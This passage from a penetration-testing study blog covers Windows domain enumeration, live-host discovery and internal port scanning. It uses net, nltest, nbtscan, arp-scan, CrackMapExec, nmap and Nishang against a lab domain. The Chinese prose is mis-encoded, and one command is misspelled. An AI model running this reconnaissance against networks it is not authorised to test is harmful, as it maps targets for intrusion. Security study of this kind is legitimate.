#æŸ¥çœ‹æŒ‡å®šåŸŸç”¨æˆ·ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745092.png" alt="image-20240324194257681"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic useraccount get Caption,Domain,Description #è·å–æ‰€æœ‰ç”¨æˆ·çš„SIDã€æ‰€å±åŸŸå’Œç”¨æˆ·æè¿°ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745093.png" alt="image-20240324195119836"></p><blockquote><p>æ³¨æ„ï¼Œåªæœ‰åŸŸç”¨æˆ·æ‰æœ‰æƒé™æ‰§è¡ŒåŸŸå†…æŸ¥è¯¢æ“ä½œã€‚è€Œè®¡ç®—æœºæœ¬åœ°ç”¨æˆ·é™¤éæå‡ä¸ºæœ¬åœ°ç³»ç»Ÿæƒé™ï¼Œå¦åˆ™åªèƒ½æŸ¥è¯¢æœ¬æœºä¿¡æ¯ï¼Œæ— æ³•æŸ¥è¯¢åŸŸå†…ä¿¡æ¯å¹¶æç¤ºâ€œæ‹’ç»è®¿é—®â€ã€‚è¿™æ˜¯å› ä¸ºï¼Œåœ¨åŸŸç¯å¢ƒä¸­ï¼Œæ‰€æœ‰ä¸åŸŸæœ‰å…³çš„æŸ¥è¯¢éƒ½éœ€è¦é€šè¿‡åŸŸæ§åˆ¶å™¨æ¥å®ç°ï¼Œå¹¶ä¸”éœ€è¦ç»è¿‡Kerberosåè®®è¿›è¡Œè®¤è¯ã€‚</p></blockquote><p><strong>æŸ¥çœ‹åŸŸç”¨æˆ·ç»„ä¿¡æ¯</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group /domain #åˆ—å‡ºåŸŸå†…çš„æ‰€æœ‰ç”¨æˆ·ç»„<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745094.png" alt="image-20240324195844774"></p><p>è¿˜å¯ä»¥é€šè¿‡ä¸Šé¢çš„ä¿¡æ¯æ¥æŒ‡å®šç”¨æˆ·ç»„æ¥æŸ¥è¯¢è¯¦ç»†ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Admins&quot; /domain #æ¯”å¦‚è¿™ä¸ªæŸ¥è¯¢åŸŸç®¡ç†å‘˜ç»„çš„ç”¨æˆ·<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745095.png" alt="image-20240324200516235"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Computers&quot; /domain #å¯ä»¥å¾—åˆ°åŸŸå†…æ‰€æœ‰çš„å®¢æˆ·ç«¯ä¸»æœº<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745096.png" alt="image-20240324200614099"></p><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§ç»„</p><table><thead><tr><th>åŸŸç»„åç§°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Domain Admins</td><td>åŸŸç®¡ç†å‘˜ç»„ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„åŸŸç®¡ç†å‘˜ç”¨æˆ·</td></tr><tr><td>Domain Computers</td><td>åŸŸæˆå‘˜ä¸»æœºç»„ï¼ŒåŒ…æ‹¬åŠ å…¥åŸŸçš„æ‰€æœ‰å·¥ä½œç«™å’ŒæœåŠ¡å™¨</td></tr><tr><td>Domain Controllers</td><td>åŸŸæ§åˆ¶å™¨ç»„ï¼ŒåŒ…æ‹¬åŸŸä¸­çš„æ‰€æœ‰åŸŸæ§åˆ¶å™¨</td></tr><tr><td>Domain Guests</td><td>åŸŸæ¥å®¾ç»„ï¼ŒåŒ…æ‹¬åŸŸä¸­æ‰€æœ‰çš„æ¥å®¾ç”¨æˆ·</td></tr><tr><td>Domain Users</td><td>åŸŸç”¨æˆ·ç»„ï¼ŒåŒ…æ‹¬æ‰€æœ‰åŸŸç”¨æˆ·</td></tr><tr><td>Enterprise Admins</td><td>ä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„ï¼Œé€‚ç”¨äºåŸŸæ—èŒƒå›´</td></tr></tbody></table><blockquote><p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒDomain Admins ç»„å’ŒEnterprise Admins ç»„ä¸­çš„ç”¨æˆ·å¯¹åŸŸå†…æ‰€æœ‰åŸŸæ§åˆ¶å™¨å’ŒåŸŸæˆå‘˜ä¸»æœºæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚Enterprise Admins ç»„æ˜¯ä¸€ä¸ªé€šç”¨ç»„ï¼Œæ˜¯åŸŸæ—çš„æ ¹åŸŸä¸­çš„ä¸€ä¸ªç»„ï¼Œå¹¶ä¸”å…¶ä¸­çš„æˆå‘˜å¯¹åŸŸæ—ä¸­çš„æ‰€æœ‰åŸŸæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™è€Œ Domain Admins ç»„æ˜¯ä¸€ä¸ªå…¨å±€ç»„ï¼Œåªå¯¹æœ¬åŸŸæ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚</p></blockquote><p><strong>æŸ¥çœ‹åŸŸå†…å¯†ç ç­–ç•¥</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net accounts /domain #æŸ¥è¯¢åŸŸå†…ç”¨æˆ·çš„å¯†ç ç­–ç•¥<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745097.png" alt="image-20240324201409096"></p><p><strong>æŸ¥çœ‹åŸŸæ§åˆ¶å™¨åˆ—è¡¨</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745098.png" alt="image-20240324202036188"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nltest /DCLIST:hacke.testlab  #ç”¨äºæŸ¥è¯¢æŒ‡å®šåŸŸå†…çš„åŸŸæ§ä¸»æœºåˆ—è¡¨<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745099.png" alt="image-20240324202555802"></p><p><strong>æŸ¥çœ‹ä¸»åŸŸæ§åˆ¶å™¨</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net time /domain<br></code></pre></td></tr></table></figure><p>åœ¨åŸŸç¯å¢ƒä¸­ï¼Œä¸»åŸŸæ§åˆ¶å™¨ä¼šåŒæ—¶è¢«ç”¨ä½œæ—¶é—´æœåŠ¡å™¨ï¼Œä½¿å¾—åŸŸä¸­æ‰€æœ‰è®¡ç®—æœºçš„æ—¶é’ŸåŒæ­¥ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œé€šè¿‡æŸ¥è¯¢æ—¶é—´æœåŠ¡å™¨æ¥æ‰¾åˆ°ä¸»åŸŸæ§åˆ¶å™¨çš„åç§°ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745100.png" alt="image-20240324202703091"></p><p><strong>å®šä½åŸŸæ§åˆ¶å™¨</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ping DC.hacke.testlab<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢çŸ¥é“ç›®æ ‡ä¸»æœºçš„ä¸»æœºååï¼Œå¯ä»¥ç›´æ¥å¯¹ä¸»æœºåæ‰§è¡Œpingå‘½ä»¤ï¼Œæ ¹æ®æ‰§è¡Œè¿”å›çš„å†…å®¹å³å¯å¾—çŸ¥ç›®æ ‡ä¸»æœºåœ¨å†…ç½‘ä¸­çš„IPåœ°å€ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745101.png" alt="image-20240324202858493"></p><p>é™¤æ­¤ä¹‹å¤–ï¼ŒåŸŸæ§åˆ¶å™¨å¾€å¾€ä¼šè¢«ç”¨ä½œDNSæœåŠ¡å™¨ï¼Œæ‰€ä»¥æ‰¾åˆ°å½“å‰ä¸»æœºçš„DNSæœåŠ¡å™¨åœ°å€ä¹Ÿå¯ä»¥å®šä½åŸŸæ§ã€‚</p><p><strong>æŸ¥çœ‹ä¿¡ä»»å…³ç³»</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nltest /domain_trusts<br></code></pre></td></tr></table></figure><p>åŸŸä¿¡ä»»ç”¨äºå¤šåŸŸç¯å¢ƒä¸­çš„è·¨åŸŸèµ„æºçš„å…±äº«ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªåŸŸçš„ç”¨æˆ·åªèƒ½è®¿é—®æœ¬åŸŸå†…çš„èµ„æºï¼Œæ— æ³•è®¿é—®å…¶ä»–åŸŸçš„èµ„æºï¼Œè€Œè¦æƒ³ä¸åŒåŸŸä¹‹é—´å®ç°äº’è®¿å°±éœ€è¦å»ºç«‹åŸŸä¿¡ä»»ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151745103.png" alt="image-20240324203208639"></p><h1 id="å†…ç½‘èµ„æºæ¢æµ‹"><a href="#å†…ç½‘èµ„æºæ¢æµ‹" class="headerlink" title="å†…ç½‘èµ„æºæ¢æµ‹"></a>å†…ç½‘èµ„æºæ¢æµ‹</h1><p>åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œæµ‹è¯•äººå‘˜å¾€å¾€éœ€è¦é€šè¿‡å„ç§å†…ç½‘æ‰«ææŠ€æœ¯æ¥æ¢æµ‹å†…ç½‘èµ„æºçš„æƒ…å†µï¼Œä¸ºåç»­çš„æ¨ªå‘æ¸—é€åšå‡†å¤‡ï¼Œé€šå¸¸éœ€è¦å‘ç°å†…ç½‘å­˜æ´»çš„ä¸»æœºï¼Œå¹¶æ¢æµ‹ä¸»æœºçš„æ“ä½œç³»ç»Ÿã€ä¸»æœºå¼€æ”¾äº†å“ªäº›ç«¯å£ã€ç«¯å£ä¸Šè¿è¡Œäº†å“ªäº›æœåŠ¡ã€æœåŠ¡çš„å½“å‰ç‰ˆæœ¬æ˜¯å¦å­˜åœ¨å·²çŸ¥æ¼æ´ç­‰ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æµ‹è¯•äººå‘˜å‘ç°å†…ç½‘çš„è–„å¼±èµ„æºï¼Œç¡®å®šåç»­çš„æ”»å‡»æ–¹å‘ã€‚</p><h2 id="å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº"><a href="#å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº" class="headerlink" title="å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº"></a>å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</h2><p>æ¸—é€æµ‹è¯•ä¸­å¯ä»¥æ ¹æ®ä¸»æœºæƒ…å†µï¼Œä¸Šä¼ å·¥å…·è¿›è¡Œä¸»æœºå­˜è´§æ¢æµ‹ï¼Œä¹Ÿå¯ä»¥å€ŸåŠ©å†…ç½‘ä»£ç†æˆ–è€…è·¯ç”±è½¬å‘å¯¹ç›®æ ‡ä¸»æœºæ‰€å¤„çš„å±€åŸŸç½‘è¿›è¡Œæ¢æµ‹ã€‚</p><p><strong>åŸºäºICMPå‘ç°å­˜æ´»ä¸»æœº</strong></p><p>pingå‘½ä»¤å°±æ˜¯åˆ©ç”¨ICMPæ•°æ®æŠ¥æ¥ç¡®è®¤ä¸»æœºæ˜¯å¦å­˜æ´»ï¼Œä¸‹é¢å‘½ä»¤å¯ä»¥å¾ªç¯æ¢æµ‹æ•´ä¸ªå±€åŸŸç½‘Cæ®µä¸­å­˜æ´»çš„ä¸»æœº</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.30.%I | findstr &quot;TTL=&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745104.png" alt="image-20240324204850543"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">for /L %I in (1,1,254)ï¼šè¿™æ˜¯ä¸€ä¸ª for å¾ªç¯è¯­å¥ï¼Œç”¨äºè¿­ä»£ä» 1 åˆ° 254 çš„æ•°å­—ã€‚%I æ˜¯ä¸€ä¸ªä¸´æ—¶å˜é‡ï¼Œå®ƒå°†åœ¨æ¯æ¬¡è¿­ä»£ä¸­ä¿å­˜å½“å‰çš„æ•°å­—ã€‚<br><br>@ping -w 1 -n 1 192.168.30.%Iï¼šåœ¨æ¯æ¬¡è¿­ä»£ä¸­ï¼Œè¯¥å‘½ä»¤é€šè¿‡ ping å‘½ä»¤å‘å±€åŸŸç½‘ä¸­çš„ä¸€ä¸ªä¸»æœºå‘é€ä¸€ä¸ª ICMP å›æ˜¾è¯·æ±‚ï¼ˆping è¯·æ±‚ï¼‰ã€‚-w 1 æŒ‡å®šè¶…æ—¶æ—¶é—´ä¸º 1 æ¯«ç§’ï¼Œ-n 1 æŒ‡å®šåªå‘é€ä¸€ä¸ª ping è¯·æ±‚ã€‚192.168.30.%I æ˜¯è¦ ping çš„ç›®æ ‡ä¸»æœºçš„ IP åœ°å€ï¼Œå…¶ä¸­ %I è¡¨ç¤ºå½“å‰è¿­ä»£çš„æ•°å­—ã€‚<br><br>| findstr &quot;TTL=&quot;ï¼šå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºé€šè¿‡ç®¡é“ä¼ é€’ç»™ findstr å‘½ä»¤ï¼Œå¹¶ä½¿ç”¨ &quot;TTL=&quot; ä½œä¸ºè¿‡æ»¤æ¡ä»¶ã€‚findstr å‘½ä»¤ç”¨äºåœ¨è¾“å‡ºä¸­æŸ¥æ‰¾åŒ…å«æŒ‡å®šæ–‡æœ¬çš„è¡Œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒå°†ç­›é€‰åŒ…å« &quot;TTL=&quot; çš„è¡Œï¼Œå› ä¸ºè¿™æ˜¯ ICMP å›æ˜¾å“åº”ä¸­çš„ä¸€ä¸ªæ ‡è¯†ç¬¦ã€‚<br><br>/Lè¡¨ç¤ºæ•°å­—ç±»å‹çš„å¾ªç¯ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸‹é¢è¿™äº›ï¼š<br>/Fï¼šç”¨äºä»æ–‡ä»¶ä¸­è¯»å–å†…å®¹è¿›è¡Œå¾ªç¯ã€‚å¯ä»¥æŒ‡å®šè¦è¯»å–çš„æ–‡ä»¶è·¯å¾„ï¼Œå¹¶ä½¿ç”¨ç‰¹å®šçš„åˆ†éš”ç¬¦å°†æ–‡ä»¶å†…å®¹æ‹†åˆ†æˆå¤šä¸ªéƒ¨åˆ†è¿›è¡Œè¿­ä»£ã€‚<br><br>/Rï¼šç”¨äºé€’å½’åœ°åœ¨ç›®å½•ç»“æ„ä¸­è¿›è¡Œå¾ªç¯ã€‚å¯ä»¥æŒ‡å®šä¸€ä¸ªç›®å½•è·¯å¾„ï¼Œå¹¶åœ¨æŒ‡å®šçš„ç›®å½•åŠå…¶å­ç›®å½•ä¸­è¿›è¡Œé€’å½’éå†ã€‚<br><br>/Dï¼šç”¨äºå¾ªç¯éå†æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å¤¹ã€‚<br><br>/INï¼šç”¨äºæŒ‡å®šä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œå°†åˆ—è¡¨ä¸­çš„æ¯ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå¾ªç¯çš„ä¸€éƒ¨åˆ†è¿›è¡Œè¿­ä»£ã€‚<br></code></pre></td></tr></table></figure><p><strong>åŸºäº NetBIOS(ç½‘ç»œåŸºæœ¬è¾“å…¥&#x2F;è¾“å‡ºç³»ç»Ÿ)åè®®å‘ç°å­˜æ´»ä¸»æœº</strong></p><p>NetBIOS æä¾› OSI&#x2F;RMçš„ä¼šè¯å±‚(åœ¨TCP&#x2F;IPæ¨¡å‹ä¸­åŒ…å«åœ¨åº”ç”¨å±‚ä¸­)æœåŠ¡ï¼Œè®©ä¸åŒè®¡ç®—æœºä¸Šè¿è¡Œçš„ä¸åŒç¨‹åºå¯ä»¥åœ¨å±€åŸŸç½‘ä¸­äº’ç›¸è¿æ¥å’Œå…±äº«æ•°æ®ã€‚</p><p>NetBIOS çš„å·¥ä½œæµç¨‹å°±æ˜¯æ­£å¸¸çš„æœºå™¨åè§£æã€æŸ¥è¯¢ã€åº”ç­”çš„è¿‡ç¨‹ã€‚åœ¨ Windows ä¸­ï¼Œé»˜è®¤å®‰è£… TCP&#x2F;IP åä¼šè‡ªåŠ¨å®‰è£… NetBIOSã€‚</p><p>åœ¨å®é™…åˆ©ç”¨æ—¶ï¼Œå‘å±€åŸŸç½‘çš„æ¯ä¸ªIPåœ°å€å‘é€NetBIOSçŠ¶æ€æŸ¥è¯¢ï¼Œå¯ä»¥è·å¾—ä¸»æœºåMAC åœ°å€ç­‰ä¿¡æ¯ã€‚</p><blockquote><p>NBTScan æ˜¯ä¸€æ¬¾ç”¨äºæ‰«æ Windows ç½‘ç»œä¸ŠNetBIOS åç§°çš„ç¨‹åº,ç”¨äºå‘ç°å†…ç½‘ä¸­å­˜æ´»çš„ Windows ä¸»æœºã€‚NBTScan å¯ä»¥å¯¹ç»™å®šIPèŒƒå›´å†…çš„æ¯ä¸ªIPåœ°å€å‘é€ NetBIOS çŠ¶æ€æŸ¥è¯¢ï¼Œå¹¶ä¸”ä»¥æ˜“è¯»çš„è¡¨æ ¼åˆ—å‡ºæ¥æ”¶åˆ°çš„ä¿¡æ¯ï¼Œå¯¹äºæ¯ä¸ªå“åº”çš„ä¸»æœºï¼Œä¼šåˆ—å‡ºå®ƒçš„IPåœ°å€NetBIOSè®¡ç®—æœºåã€ç™»å½•ç”¨æˆ·åå’ŒMACåœ°å€ã€‚å·¥å…·åœ°å€ï¼š<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p></blockquote><p>å°†å·¥å…·ä¸Šä¼ åˆ°ä¸»æœºä¹‹åæ‰§è¡Œä¸‹é¢å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nbtscan 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745105.png" alt="image-20240324212209943"></p><p><strong>åŸºäºUDPå‘ç°å­˜æ´»ä¸»æœº</strong></p><p>åœ¨å®é™…åˆ©ç”¨ä¸­ï¼Œå¯ä»¥å°†ä¸€ä¸ªç©ºçš„UDPæŠ¥æ–‡å‘é€åˆ°ç›®æ ‡ä¸»æœºçš„ç‰¹å®šç«¯å£ï¼Œå¦‚æœç›®æ ‡ä¸»æœºçš„ç«¯å£æ˜¯å…³é—­çš„ï¼ŒUDPæ¢æµ‹å°±é©¬ä¸Šå¾—åˆ°ä¸€ä¸ªICMPç«¯å£æ— æ³•åˆ°è¾¾çš„å›åº”æŠ¥æ–‡ï¼Œè¿™æ„å‘³ç€è¯¥ä¸»æœºæ­£åœ¨è¿è¡Œã€‚å¦‚æœåˆ°è¾¾ä¸€ä¸ªå¼€æ”¾çš„ç«¯å£ï¼Œå¤§éƒ¨åˆ†æœåŠ¡ä»…ä»…å¿½ç•¥è¿™ä¸ªç©ºæŠ¥æ–‡è€Œä¸åšä»»ä½•å›åº”ã€‚</p><p>Unicornscan æ˜¯Kali Linuxå¹³å°çš„ä¸€æ¬¾ä¿¡æ¯æ”¶é›†å·¥å…·ï¼Œæä¾›äº†ç½‘ç»œæ‰«æåŠŸèƒ½ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œé€šè¿‡ UDPåè®®æ‰«æå†…ç½‘çš„å­˜æ´»ä¸»æœº</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">unicornscan -mU 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745106.png" alt="image-20240324212621176"></p><p><strong>åŸºäºARPå‘ç°å­˜æ´»ä¸»æœº</strong></p><p>åœ¨å®é™…åˆ©ç”¨ä¸­ï¼Œå¯ä»¥å‘ç½‘ç»œå‘é€ä¸€ä¸ªARPè¯·æ±‚ï¼Œè‹¥ç›®æ ‡ä¸»æœºå¤„äºæ´»è·ƒçŠ¶æ€ï¼Œåˆ™å…¶ä¸€å®šä¼šå›åº”ä¸€ä¸ª ARP å“åº”ï¼Œå¦åˆ™ä¸ä¼šåšå‡ºä»»ä½•å›åº”ã€‚</p><ul><li>åˆ©ç”¨ARP-Scan</li></ul><p>ARP-Scan æ˜¯ä¸€æ¬¾å¿«é€Ÿã€ä¾¿æ·çš„å†…ç½‘æ‰«æå·¥å…·ï¼Œåˆ©ç”¨ ARP å‘ç°å†…ç½‘ä¸­å­˜æ´»çš„ä¸»æœºã€‚å°†å·¥å…·ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå³å¯æ‰«æå†…ç½‘ä¸­å­˜æ´»çš„ä¸»æœºã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">arp-scan -t 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745107.png" alt="image-20240324213635193"></p><ul><li>åˆ©ç”¨powershell</li></ul><p>Empire æ¸—é€æ¡†æ¶çš„ Invoke-ARPScan.pslè„šæœ¬å¯åˆ©ç”¨ ARPå‘ç°å†…ç½‘å­˜æ´»ä¸»æœºï¼Œå·¥å…·åœ°å€ï¼š<a href="https://github.com/EmpireProject/Empire%E3%80%82(%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%E7%94%A8%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%B2%A1%E6%89%BE%E5%88%B0powershell%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%A5%BD%E5%83%8F%E6%98%AF%E5%B7%B2%E7%BB%8F%E5%8F%96%E6%B6%88%E4%BA%86%EF%BC%8C%E6%8A%8A%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%BE%E8%BF%99)%E4%BD%BF%E7%94%A8%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E5%B0%86%E8%84%9A%E6%9C%AC%E5%AF%BC%E5%85%A5%E6%89%A7%E8%A1%8C">https://github.com/EmpireProject/Empireã€‚(æš‚æ—¶ä¸ä¼šç”¨ï¼Œå› ä¸ºæ²¡æ‰¾åˆ°powershellè„šæœ¬ï¼Œå¥½åƒæ˜¯å·²ç»å–æ¶ˆäº†ï¼ŒæŠŠä½¿ç”¨å‘½ä»¤æ”¾è¿™)ä½¿ç”¨æ—¶ï¼Œéœ€è¦å°†è„šæœ¬å¯¼å…¥æ‰§è¡Œ</a>:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-ARPScan.ps1<br>Invoke-ARPScan -CIDR 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><strong>åŸºäº SMB(Server Message Blockï¼ŒæœåŠ¡å™¨æ¶ˆæ¯å—)åè®®å‘ç°å­˜æ´»ä¸»æœº</strong></p><p>SMB åˆç§°ä¸ºç½‘ç»œæ–‡ä»¶å…±äº«ç³»ç»Ÿ(CommonInternetFileSystemï¼ŒCIFS)åè®®ï¼Œæ˜¯ä¸€ç§åº”ç”¨å±‚ä¼ è¾“åè®®ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä½¿ç½‘ç»œä¸Šçš„æœºå™¨èƒ½å¤Ÿå…±äº«è®¡ç®—æœºæ–‡ä»¶ã€æ‰“å°æœºã€ä¸²è¡Œç«¯å£å’Œé€šä¿¡ç­‰èµ„æºã€‚CIFS æ¶ˆæ¯ä¸€èˆ¬ä½¿ç”¨ NetBIOS æˆ– TCP å‘é€ï¼Œåˆ†åˆ«ä½¿ç”¨139æˆ– 445 ç«¯å£ç›®å‰å€¾å‘äºä½¿ç”¨ 445 ç«¯å£ã€‚</p><p>åœ¨å®é™…åˆ©ç”¨ä¸­ï¼Œå¯ä»¥æ¢æµ‹å±€åŸŸç½‘ä¸­å­˜åœ¨çš„SMB æœåŠ¡ï¼Œä»è€Œå‘ç°å†…ç½‘çš„å­˜æ´»ä¸»æœºï¼Œå¤šé€‚ç”¨äº Windows ä¸»æœºçš„å‘ç°ã€‚</p><p>CrackMapExec(ç®€ç§°CME)æ˜¯ä¸€æ¬¾ååˆ†å¼ºå¤§çš„åæ¸—é€åˆ©ç”¨å·¥å…·ï¼Œåœ¨KaliLinuxä¸Šå¯ä»¥ç›´æ¥ä½¿ç”¨ apt-getå‘½ä»¤è¿›è¡Œå®‰è£…ã€‚CrackMapExecèƒ½å¤Ÿæšä¸¾ç™»å½•ç”¨æˆ·ã€æšä¸¾SMBæœåŠ¡åˆ—è¡¨ã€æ‰§è¡Œ WINRM æ”»å‡»ç­‰åŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©æµ‹è¯•äººå‘˜è‡ªåŠ¨åŒ–è¯„ä¼°å¤§å‹åŸŸç½‘ç»œçš„å®‰å…¨æ€§.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">crackmapexec smb 192.168.30.1/24<br></code></pre></td></tr></table></figure><p>æˆ‘çš„kaliä¸åœ¨åŒä¸€ä¸ªç½‘ç»œæ£€æµ‹ä¸äº†ï¼Œæ£€æµ‹å‡ºæ¥çš„æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151745108.png" alt="image-20240324215607566"></p><h2 id="å†…ç½‘ç«¯å£æ‰«æ"><a href="#å†…ç½‘ç«¯å£æ‰«æ" class="headerlink" title="å†…ç½‘ç«¯å£æ‰«æ"></a>å†…ç½‘ç«¯å£æ‰«æ</h2><p>ç«¯å£æ‰«æå°±æ˜¯ç”¨äºæ¢æµ‹ä¸»æœºå¼€å¯äº†å“ªäº›æœåŠ¡ï¼Œä»è€ŒæŸ¥æ‰¾ç›¸åº”çš„æ¼æ´è¿›è¡Œæ”»å‡»</p><p><strong>åˆ©ç”¨Telnetæ¢æµ‹ç«¯å£</strong></p><p>Telnet æ˜¯è¿›è¡Œè¿œç¨‹ç™»å½•çš„æ ‡å‡†åè®®å’Œä¸»è¦æ–¹å¼,ä¸ºç”¨æˆ·æä¾›äº†åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šå®Œæˆè¿œç¨‹ä¸»æœºå·¥ä½œçš„èƒ½åŠ›ã€‚telnetå‘½ä»¤å¯ä»¥ç®€å•æµ‹è¯•æŒ‡å®šçš„ç«¯å£å·æ˜¯æ­£å¸¸æ‰“å¼€è¿˜æ˜¯å…³é—­çŠ¶æ€ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745109.png" alt="image-20240324221045451"></p><p><strong>åˆ©ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</strong></p><p>Nmap æ˜¯ä¸€ä¸ªååˆ†å¼ºå¤§çš„ç«¯å£æ‰«æå·¥å…·,åœ¨å®é™…åˆ©ç”¨ä¸­å¯ä»¥å€ŸåŠ©å†…ç½‘ä»£ç†å¯¹å†…ç½‘ä¸»æœºè¿›è¡Œç«¯å£æ‰«æã€‚nmapçš„ä½¿ç”¨éœ€è¦å¥½å¥½å»å­¦ä¹ ï¼Œåˆ°æ—¶æŸ¥æŸ¥èµ„æ–™å­¦ä¹ ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„æ‰«æå‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -p 80,88,135,139,443,8080,3306,3389 172.25.87.14 #æ‰«æç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745110.png" alt="image-20240324221409497"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">namp -sS -p 1-65535 172.25.87.14 #æ‰«æç›®æ ‡ä¸»æœºçš„å…¨éƒ¨ç«¯å£<br><br>nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11 #æ‰«æå¹¶è·å–ç›®æ ‡ä¸»æœºæŒ‡å®šç«¯å£ä¸Šå¼€æ”¾çš„æœåŠ¡ç‰ˆæœ¬<br></code></pre></td></tr></table></figure><p><strong>åˆ©ç”¨PowerShellè¿›è¡Œç«¯å£æ‰«æ</strong></p><p>NiShang æ˜¯åŸºäºPowerShell çš„æ¸—é€æµ‹è¯•ä¸“ç”¨æ¡†æ¶ï¼Œé›†æˆäº†å„ç§è„šæœ¬å’ŒPayloadï¼Œå¹¿æ³›ç”¨äºæ¸—é€æµ‹è¯•çš„å„é˜¶æ®µã€‚<br>NiShang çš„ Scan æ¨¡å—ä¸­ä¹Ÿæœ‰ä¸€ä¸ª Invoke-PortsCan.ps1 è„šæœ¬ï¼Œå¯ä»¥ç”¨æ¥å¯¹ä¸»æœºè¿›è¡Œç«¯å£æ‰«æï¼Œå·¥å…·åœ°å€ï¼š<a href="https://github.com/samratashok/nishang%E3%80%82">https://github.com/samratashok/nishangã€‚</a></p><p><img src="http://cdn.clown2024.cn/202407151745111.png" 